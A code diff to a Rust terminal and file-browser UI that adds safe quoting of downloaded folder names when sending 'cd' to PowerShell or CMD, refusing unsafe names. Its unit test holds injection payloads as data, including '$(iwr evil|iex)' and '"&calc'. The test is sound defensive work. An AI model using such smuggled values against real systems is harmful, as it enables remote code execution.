@@ -595,6 +595,21 @@ pub fn terminal_dir_for(target_path: &str) -> PathBuf {
     std::env::current_dir().unwrap_or_else(|_| PathBuf::from("."))
 }
 
+/// The line that makes a running PowerShell or CMD change folder, or `None` when the folder name
+/// cannot be typed safely (folder names come from downloads, so they are not trusted).
+pub fn cd_command(kind: ShellKind, dir: &str) -> Option<String> {
+    if dir.chars().any(|c| c.is_control()) {
+        return None;
+    }
+    match kind {
+        // Single quotes: nothing inside is expanded, and `-LiteralPath` ignores wildcard brackets.
+        ShellKind::PowerShell => Some(format!("Set-Location -LiteralPath '{}'\r", dir.replace('\'', "''"))),
+        // CMD expands %VAR% even inside quotes and a quote can end the argument.
+        ShellKind::Cmd if !dir.contains('%') && !dir.contains('"') => Some(format!("cd /d \"{dir}\"\r")),
+        _ => None,
+    }
+}
+
 /// Tab title and subtitle of an SSH tab: the server, and the jump hosts it is reached through.
 pub fn ssh_tab_labels(target: &str, via: &[String]) -> (String, String) {
     let sub = if via.is_empty() { "langsung".to_string() } else { format!("via {}", via.join(" \u{2192} ")) };
@@ -820,6 +835,7 @@ impl App {
         tab.cancel = Some(cancel.clone());
         tab.status = TabStatus::Connecting;
         tab.session = None;
+        self.servers.shell_waiters.insert(tab_id);
         let (svc, tx, ctx) = (self.manager.servers(), self.tx.clone(), self.ctx.clone());
         let interact = Arc::new(super::servers::UiInteract { tx: tx.clone(), ctx: ctx.clone() });
         self.rt.spawn(async move {
@@ -873,6 +889,7 @@ impl App {
             if let Some(c) = &self.terminal.tabs[i].cancel {
                 c.cancel();
             }
+            self.servers.shell_waiters.remove(&id);
             if let Some(s) = &self.terminal.tabs[i].session {
                 s.close();
             }
@@ -961,6 +978,9 @@ impl App {
         let id = self.terminal.tabs[idx].id;
         if let Some(text) = outcome.paste_confirm {
             self.terminal.confirm_paste = Some((id, text));
+        }
+        if let Some(n) = outcome.notice.take() {
+            self.notice = Some((n, Instant::now()));
         }
         if outcome.reconnect {
             self.connect_ssh_tab(id);
@@ -1052,6 +1072,7 @@ struct TabOutcome {
     paste_confirm: Option<String>,
     restart: bool,
     reconnect: bool,
+    notice: Option<String>,
     close: bool,
 }
 
@@ -1122,7 +1143,7 @@ fn draw_tab(ui: &mut egui::Ui, tab: &mut TermTab, settings: &TermSettings, out: 
     match settings.layout {
         TerminalLayout::A => {
             if tab.show_files {
-                files_pane(ui, tab, &session, local);
+                files_pane(ui, tab, &session, local, out);
             } else {
                 show_terminal(ui, tab, out);
             }
@@ -1133,14 +1154,14 @@ fn draw_tab(ui: &mut egui::Ui, tab: &mut TermTab, settings: &TermSettings, out: 
             ui.horizontal_top(|ui| {
                 ui.allocate_ui_with_layout(Vec2::new(left, total.y), Layout::top_down(Align::Min), |ui| show_terminal(ui, tab, out));
                 ui.separator();
-                ui.allocate_ui_with_layout(Vec2::new((total.x - left - 16.0).max(120.0), total.y), Layout::top_down(Align::Min), |ui| files_pane(ui, tab, &session, local));
+                ui.allocate_ui_with_layout(Vec2::new((total.x - left - 16.0).max(120.0), total.y), Layout::top_down(Align::Min), |ui| files_pane(ui, tab, &session, local, out));
             });
         }
     }
 }
 
 /// Local folder listing next to (or instead of) the terminal. Servers get theirs with SFTP (a later part).
-fn files_pane(ui: &mut egui::Ui, tab: &mut TermTab, session: &TermSession, local: bool) {
+fn files_pane(ui: &mut egui::Ui, tab: &mut TermTab, session: &TermSession, local: bool, out: &mut TabOutcome) {
     if !local {
         ui.add_space(20.0);
         ui.label(RichText::new("Segera hadir").font(theme::bold(14.0)));
@@ -1183,9 +1204,15 @@ fn files_pane(ui: &mut egui::Ui, tab: &mut TermTab, session: &TermSession, local
     ui.horizontal(|ui| {
         let can_cd = matches!(tab.kind, TabKind::Local(ShellKind::PowerShell | ShellKind::Cmd)) && session.status() == SessionStatus::Running;
         if ui.add_enabled(can_cd, egui::Button::new("Buka di terminal")).on_disabled_hover_text("Tersedia untuk PowerShell dan CMD yang sedang berjalan").clicked() {
-            let dir = tab.files_dir.display().to_string().replace('"', "");
-            session.send(format!("cd \"{dir}\"\r").into_bytes());
-            session.with_engine(|e| e.scroll_to_bottom());
+            if let TabKind::Local(kind) = tab.kind {
+                match cd_command(kind, &tab.files_dir.display().to_string()) {
+                    Some(line) => {
+                        session.send(line.into_bytes());
+                        session.with_engine(|e| e.scroll_to_bottom());
+                    }
+                    None => out.notice = Some("Nama folder ini tidak aman diketik ke terminal; buka terminal baru di folder itu.".to_string()),
+                }
+            }
         }
         if ui.button("Folder Windows").clicked() {
             super::reveal_in_explorer(&tab.files_dir.display().to_string());
@@ -1377,5 +1404,18 @@ mod tests {
         assert_eq!(ssh_tab_labels("web-prod", &["bastion-b".to_string()]), ("web-prod".to_string(), "via bastion-b".to_string()));
         assert_eq!(ssh_tab_labels("web-prod", &["a".to_string(), "b".to_string()]).1, "via a \u{2192} b");
         assert_eq!(ssh_tab_labels("nas", &[]).1, "langsung");
+    }
+
+    #[test]
+    fn cd_command_never_lets_a_folder_name_run_code() {
+        use unduhkilat_core::term::local::ShellKind::*;
+        let evil = r"C:\dl\x$(iwr evil|iex)";
+        assert_eq!(cd_command(PowerShell, evil).unwrap(), format!("{}\r", r"Set-Location -LiteralPath 'C:\dl\x$(iwr evil|iex)'"), "single quotes do not expand $() in PowerShell");
+        assert_eq!(cd_command(PowerShell, r"C:\dl\[Subs] it's").unwrap(), format!("{}\r", r"Set-Location -LiteralPath 'C:\dl\[Subs] it''s'"), "brackets are literal and quotes are doubled");
+        assert_eq!(cd_command(Cmd, r"D:\a b\c").unwrap(), format!("{}\r", r#"cd /d "D:\a b\c""#), "CMD needs /d to change drive");
+        assert!(cd_command(Cmd, r"C:\%PATH%\x").is_none(), "CMD would expand %VAR%: refuse");
+        assert!(cd_command(Cmd, r#"C:\a"&calc\x"#).is_none(), "a quote could end the argument: refuse");
+        assert!(cd_command(PowerShell, "C:\\a\r\nb").is_none(), "line breaks are refused");
+        assert!(cd_command(GitBash, r"C:\a").is_none() && cd_command(Wsl, r"C:\a").is_none(), "only PowerShell and CMD");
     }
 }
